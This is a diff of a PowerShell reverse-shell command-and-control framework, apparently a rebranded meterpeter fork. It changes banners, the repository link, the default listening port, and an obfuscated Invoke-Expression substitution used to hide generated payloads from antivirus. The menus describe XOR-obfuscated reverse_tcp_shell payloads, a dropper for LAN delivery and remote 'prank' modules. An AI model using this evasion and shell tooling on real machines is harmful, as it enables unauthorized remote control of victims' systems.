@@ -174,9 +174,9 @@ Write-Host "     //              |                                           " -
 Write-Host "    (|   `;      ,   |                                           " -ForegroundColor Blue
 Write-Host "      \   ;.----/  ,/                                            " -ForegroundColor Blue
 Write-Host "       ) // /   | |\ \                                           " -ForegroundColor Blue
-Write-Host "       \ \\ `\   | |/ /      Jesus Christ                         " -ForegroundColor Blue
+Write-Host "       \ \\ \   | |/ /      Jesus Christ                         " -ForegroundColor Blue
 Write-Host "        \ \\ \  | |\/  The Lamb that was slain                   " -ForegroundColor Blue
-Write-Host "         `''  `'' `''`         for our sins.                       " -ForegroundColor Blue
+Write-Host "         `''  `'' `''`         for our sins.                     " -ForegroundColor Blue
 
 Write-Host "          __                 _____ _____     _     _             " -ForegroundColor Yellow
 Write-Host "       __|  |___ ___ _ _ ___|     |  |  |___|_|___| |_           " -ForegroundColor Yellow
@@ -196,7 +196,7 @@ Write-Host "[ NetScanner   Local LAN network scanner sub-menu         ]     " -F
 Write-Host "[ Pranks       Prank remote host modules sub-menu         ]     " -ForegroundColor Blue
 Write-Host "[ exit         Exit rev_tcp_shell [server+client]         ]     " -ForegroundColor Blue
 
-write-host "`n  * GitHub: https://github.com/r00t-3xp10it/meterpeter *`n" -ForegroundColor Green
+write-host "`n *Git: https://github.com/r0jahsm0ntar1/africana-framework`n" -ForegroundColor Green
 $DISTRO_OS = pwd|Select-String -Pattern "/" -SimpleMatch; # <-- (check IF windows|Linux Separator)
 If($DISTRO_OS)
 {
@@ -223,7 +223,7 @@ $LPORT = Read-Host;
 $Local_Port = $LPORT -replace " ","";
 
 ## Default settings
-If(-not($Local_Port)){$Local_Port = "666"};
+If(-not($Local_Port)){$Local_Port = "9999"};
 If(-not($Local_Host)){
    If($DISTRO_OS){
       ## Linux Flavor
@@ -292,7 +292,7 @@ Write-Host "[ distros. It creates reverse_tcp_shell payloads          ]     " -F
 Write-Host "[ (pure PWSH + SOC) obfuscated in BXOR using a secret key ]     " -ForegroundColor Blue
 Write-Host "[ and also creates one dropper file that allow users to   ]     " -ForegroundColor Blue
 Write-Host "[ fast deliver the payload on LAN networks for tests.     ]     " -ForegroundColor Blue
-write-host "`n  * GitHub: https://github.com/r00t-3xp10it/meterpeter *`n" -ForegroundColor Green
+write-host "`n *Git: https://github.com/r0jahsm0ntar1/africana-framework`n" -ForegroundColor Green
 Write-Host " - Payload    : $payload_name.ps1"
 Write-Host " - Local Host : $Local_Host"
 Write-Host " - Local Port : $Local_Port"
@@ -310,8 +310,8 @@ $My_Output = "$PowerShell_Payload" | Out-File -FilePath $IPATH$payload_name.ps1 
 
 ## Better obfu`scated IE`X system call
 $ttl = ("I" + "@_`X" -Join '') -replace '@_','E'
-#((Get-Content -Path $IPATH$payload_name.ps1 -Raw) -Replace "$ttl","Get-Date -Format 'HH:mm:ss'|Out-File bios.log;&(''.SubString.ToString()[67,72,64]-Join'')")|Set-Content -Path $IPATH$payload_name.ps1
-((Get-Content -Path $IPATH$payload_name.ps1 -Raw) -Replace "$ttl","&('REX' -replace 'R','I')")|Set-Content -Path $IPATH$payload_name.ps1
+((Get-Content -Path $IPATH$payload_name.ps1 -Raw) -Replace "$ttl","Get-Date -Format 'HH:mm:ss'|Out-File bios.log;&(''.SubString.ToString()[67,72,64]-Join'')")|Set-Content -Path $IPATH$payload_name.ps1
+#((Get-Content -Path $IPATH$payload_name.ps1 -Raw) -Replace "$ttl","&('REX' -replace 'R','I')")|Set-Content -Path $IPATH$payload_name.ps1
 
 
 $Server_port = "$Local_Host"+":"+"$HTTP_PORT";
@@ -4697,4 +4697,5 @@ While($Client.Connected)
     $OutPut = $Null;
   }
  }
-}
+}
+
